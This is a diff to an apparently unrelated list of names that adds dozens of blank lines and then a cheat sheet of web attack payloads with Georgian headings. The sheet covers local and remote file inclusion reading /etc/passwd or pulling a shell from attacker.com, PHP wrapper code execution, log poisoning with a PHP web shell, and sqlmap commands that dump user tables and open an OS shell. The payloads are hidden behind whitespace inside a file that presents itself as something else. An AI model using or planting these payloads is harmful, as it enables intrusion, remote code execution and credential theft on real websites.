@@ -47,3 +47,61 @@ slightly-broken
 ping-station
 downloader-v1
 puzzled)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+საბაზისო LFI:
+text
+http://example.com/?page=../../../../etc/passwd
+http://example.com/?file=file:///etc/passwd
+PHP Wrapper-ები:
+text
+http://example.com/?page=php://filter/convert.base64-encode/resource=index.php
+http://example.com/?page=data://text/plain,<?php system("id"); ?>
+RFI (Remote File Inclusion):
+text
+http://example.com/?page=http://attacker.com/shell.txt
+Log Poisoning (Apache/Nginx):
+text
+curl "http://example.com" -H "User-Agent: <?php system($_GET['cmd']); ?>"
+http://example.com/?page=/var/log/apache2/access.log&cmd=id
+
+
+sqlmap -u "http://example.com/?id=1" --dbs
+sqlmap -u "http://example.com/?id=1" -D database_name --tables
+sqlmap -u "http://example.com/?id=1" -D database_name -T users --dump
+sqlmap -u "http://example.com/?id=1" --os-shell
